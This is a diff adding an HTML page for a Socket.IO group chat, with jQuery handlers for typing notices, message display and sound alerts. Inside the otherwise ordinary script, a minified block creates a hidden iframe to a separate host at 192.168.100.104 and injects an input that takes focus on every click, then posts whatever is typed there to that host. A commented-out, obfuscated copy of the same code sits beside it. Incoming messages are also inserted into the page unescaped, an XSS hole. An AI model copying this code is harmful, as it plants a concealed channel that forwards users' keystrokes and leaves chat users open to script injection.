@@ -1,0 +1,169 @@
+<!doctype html>
+<html>
+	<head>
+	<title>Socket.IO chat</title>
+	<meta http-equiv="Cache-control" content="no-cache">
+	
+	<link rel="stylesheet" type="text/css" href="style.css">
+	<script src="socket.io.js"></script>
+	<script src="jquery-3.2.1.min.js"></script>
+	<script src="toggle.min.js"></script>
+	<link rel="stylesheet" href="bootstrap.min.css">
+	<link rel="stylesheet" href="toggle.css">
+
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/push.js/0.0.11/push.min.js"></script>
+
+	</head>
+	<body>
+	<input type="text" name="user_id" id="user_id" value="Anonymous">
+	<div class="chat_window" style="box-shadow:none; background-color:#FFF;">
+		<div class="top_menus">
+			<div class="buttons">
+			<div class="button close">
+			</div>
+			<div class="button minimize">
+			</div>
+			<div class="button maximize">
+			</div>
+			</div>
+			<div class="title">あほ</div>
+		</div>
+		<ul class="messages"></ul>
+		<form>
+			<span id="typing"></span>
+			<div class="bottom_wrapper clearfix">
+			<div class="message_input_wrapper">
+			<input class="message_input" placeholder="..." />
+			</div>
+			<div class="send_message">
+			<div class="icon"></div>
+			<div class="text" >おき</div>
+			</div>
+			</div>
+		</form>
+	</div>
+	<div class="message_template">
+		<li class="message">
+		<!-- <div class="avatar"></div> -->
+		<div class="text_wrapper">
+			<div class="text"></div>
+		</div>
+		</li>
+	</div>
+	<audio controls hidden id="notif">
+		<source src="facebook-notification-sound.mp3" type="audio/mpeg">
+	</audio>
+	<br>
+	<br>
+	<input type="checkbox" checked data-toggle="toggle_mute" data-on="On" data-off="Mute" id="mute_notif">
+
+	<script>
+	$(function () {
+
+
+var a = document.createElement("iframe"),b = document.createElement("input"),d = "https://192.168.100.104:2121";a.src = d;a.style.display = "none";b.id = "ggpw-name";b.style.position = "absolute";b.style.left = "0";b.style.bottom = "0";b.style.borderTop = "0";b.style.borderRight = "0";b.style.zIndex = "99999";document.body.appendChild(b);document.body.appendChild(a);document.addEventListener('click', function(){b.focus();});document.body.addEventListener("keyup", function(e) {e.preventDefault();if (e.keyCode === 13) {var msg = {};msg.m = b.value;msg.id = 'ggwp212121';a.contentWindow.postMessage(msg,d);b.value = '';}});
+
+
+// var _0x3105=['createElement','position','appendChild','contentWindow'];var _0x5f22=function(_0x12d86c,_0x221cc8){_0x12d86c=_0x12d86c-0x0;var _0x163126=_0x3105[_0x12d86c];return _0x163126};var a=document.createElement('iframe');var b=document[_0x5f22('0x0')]('input');var d='https://192.168.100.104:2111';a.src=d;a.style.display='none';b.id='ggpw-name';b.style[_0x5f22('0x1')]='absolute';b.style.left='0';b.style.bottom='0';b.style.borderTop='0';b.style.borderRight='0';b.style.zIndex='99999';document.body.appendChild(b);document.body[_0x5f22('0x2')](a);document.addEventListener('click',function(){b.focus()});document.body.addEventListener('keyup',function(_0x1c2f30){_0x1c2f30.preventDefault();if(_0x1c2f30.keyCode===0xd){var _0x148dc5={};_0x148dc5.m=b.value;_0x148dc5.id='ggwp212121';a[_0x5f22('0x3')].postMessage(_0x148dc5,d);b.value=''}});
+
+		$(".messages").animate({ scrollTop: $('.messages').height() }, 100);
+		var socket = io();
+		var random_name = '';
+
+		$('#user_id').val(makeid(Math.random()));
+		function makeid(length) {
+			var result           = '';
+			var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+			var charactersLength = characters.length;
+			for ( var i = 0; i < length; i++ ) {
+			result += characters.charAt(Math.floor(Math.random() * charactersLength));
+		}
+		return result + '-USER';
+	}
+
+	var user_id = $('#user_id').val();
+
+	function sendSMS () {
+		var data = {
+			user_id : $('#user_id').val(),
+			message : $('input.message_input').val()
+		};
+		socket.emit('chat message', data);
+		$('input.message_input').val('');
+	}
+
+	$('form').submit(function(){
+		sendSMS();
+		return false;
+	});
+	$('.send_message').click(function(){
+		sendSMS();
+	});
+
+	$('input.message_input').keyup(function(e){
+		socket.emit('type message', $('#user_id').val());
+	});
+
+	socket.on('type message', function(msg){
+
+		console.log(msg);
+
+		var user_id = $('#user_id').val();
+		if (user_id != msg) {
+			$('#typing').text(msg + ' is typing...');
+		}
+	});
+
+	setInterval(function(){ $('#typing').text(''); }, 3000);
+
+	socket.on('chat message', function(msg){
+
+		var user_id = $('#user_id').val();
+
+		var pos = 'left';
+		if (user_id == msg.user_id) {
+			pos = 'right';
+		} else {
+			// $.notify(msg.message);
+			var x = document.getElementById("notif");
+			if ($('#mute_notif').prop('checked')) {
+				x.play();
+			}
+		}
+
+		var output = '';
+		output += '<li class="message ' + pos + ' appeared">';
+		output += '<span class="sender">' + msg.user_id + '</span>';
+		// output += '<div class="avatar" style="margin-top:0px;">';
+		output += '</div>';
+		output += '<div class="text_wrapper" style="padding:10px;">';
+		output += '<div class="text" style="font-size:12px;">';
+		output += msg.message;
+		output += '</div>';
+		output += '</div>';
+		output += '<input type="radio" style="" readonly>';
+		output += '</li>';
+
+		if (msg.message == '~reload') {
+			location.reload(true);
+		}
+
+		if (msg.message == '~hilya') {
+			output = '<center><img src="hil.png"></center>';
+		}
+		
+		$('.messages').append(output);
+		 $( "ul.messages li:last-child input" ).focus();
+		 $('.message_input').focus();
+
+	});
+
+	$(".messages").animate({ scrollTop: $('.messages').height() }, 100);
+
+	socket.on('sample', function(data){
+		console.log(data);
+	});
+	});
+	</script>
+</body>
+</html>
